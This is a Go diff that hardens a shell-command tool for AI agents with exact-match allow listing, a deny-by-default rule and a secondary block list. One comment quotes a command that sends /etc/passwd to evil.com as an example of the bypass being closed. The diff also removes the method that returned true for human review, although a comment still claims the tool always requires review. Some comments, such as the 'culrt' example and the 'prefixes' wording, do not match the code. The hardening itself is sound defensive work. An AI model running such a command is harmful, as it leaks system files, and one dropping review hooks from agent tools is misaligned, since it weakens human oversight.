@@ -5,14 +5,18 @@ import (
 	"context"
 	"fmt"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strings"
 	"time"
-	//"github.com/Ecook14/gocrewwai/pkg/utils"
 )
 
 // ShellTool allows agents to execute shell commands on the host system.
 // This tool is inherently dangerous and always requires human review.
+// Only commands whose basename matches an entry in AllowedCommands are permitted.
+// When AllowedCommands is empty (the default), ALL commands are denied — no bypass
+// via prefix matching (e.g. "curl" must not match "curl http://...").
+// For safety, start with an empty AllowedCommands list and add only specific commands.
 //
 // Input examples:
 //
@@ -21,8 +25,8 @@ import (
 //	{"command": "df -h"}
 type ShellTool struct {
 	BaseTool
-	AllowedCommands []string      // Whitelist (empty = allow all)
-	BlockedCommands []string      // Blacklist
+	AllowedCommands []string      // Whitelist — when non-empty, ONLY these prefixes are permitted. Empty = DENY ALL.
+	BlockedCommands []string      // Blacklist (defense-in-depth; not a primary boundary)
 	DefaultTimeout  time.Duration // Default command timeout
 	WorkingDir      string        // Default working directory
 }
@@ -75,25 +79,50 @@ func (t *ShellTool) Execute(ctx context.Context, input map[string]interface{}) (
 		return "", fmt.Errorf("'command' is required")
 	}
 
-	// Security: Check blocked commands
 	cmdLower := strings.ToLower(strings.TrimSpace(command))
-	for _, blocked := range t.BlockedCommands {
-		if strings.Contains(cmdLower, strings.ToLower(blocked)) {
-			return "", fmt.Errorf("command blocked for safety: contains '%s'", blocked)
-		}
-	}
 
 	// Security: Check allowed commands whitelist
+	// When AllowedCommands is non-empty, enforce a whitelist using exact
+	// command matching (not prefix). This prevents bypass via e.g.
+	// "curl http://evil.com/$(cat /etc/passwd)" when "curl" is allowed.
+	// Prefix matching would allow "culrt" to pass if "curl" is whitelisted.
+	// Exact matching requires the command word to match exactly.
+	// When AllowedCommands is empty, DENY ALL commands (secure default).
 	if len(t.AllowedCommands) > 0 {
+		// Extract the first whitespace-delimited token as the command
+		cmdTokens := strings.Fields(cmdLower)
+		if len(cmdTokens) == 0 {
+			return "", fmt.Errorf("empty command")
+		}
+		cmdWord := cmdTokens[0]
+		// Resolve to absolute path if it contains a slash (e.g. /usr/bin/cat)
+		if strings.Contains(cmdWord, "/") {
+			// Allow absolute paths only if the basename matches an allowed command
+			cmdWord = filepath.Base(cmdWord)
+		}
 		allowed := false
-		for _, prefix := range t.AllowedCommands {
-			if strings.HasPrefix(cmdLower, strings.ToLower(prefix)) {
+		for _, allowedCmd := range t.AllowedCommands {
+			if strings.EqualFold(cmdWord, strings.ToLower(allowedCmd)) {
 				allowed = true
 				break
 			}
 		}
 		if !allowed {
-			return "", fmt.Errorf("command not in allowed list: %s", command)
+			return "", fmt.Errorf("command not in allowed list: %s (allowed: %v)", command, t.AllowedCommands)
+		}
+	} else {
+		return "", fmt.Errorf("no allowed commands configured; set AllowedCommands to permit specific commands")
+	}
+
+	// Defense-in-depth: block dangerous patterns even when whitelisted.
+	// This is NOT a primary security boundary (whitelist is), but adds a
+	// second layer for common destructive patterns that may slip through
+	// if a prefix like "rm" is allowed.
+	if len(t.BlockedCommands) > 0 {
+		for _, blocked := range t.BlockedCommands {
+			if strings.Contains(cmdLower, strings.ToLower(blocked)) {
+				return "", fmt.Errorf("command blocked for safety: contains '%s'", blocked)
+			}
 		}
 	}
 
@@ -151,6 +180,5 @@ func (t *ShellTool) Execute(ctx context.Context, input map[string]interface{}) (
 	return output, nil
 }
 
-func (t *ShellTool) RequiresReview() bool {
-	return true // Default for decoupled shell tool
-}
+func (t *ShellTool) Name() string { return t.BaseTool.NameValue }
+func (t *ShellTool) Description() string { return t.BaseTool.DescriptionValue }
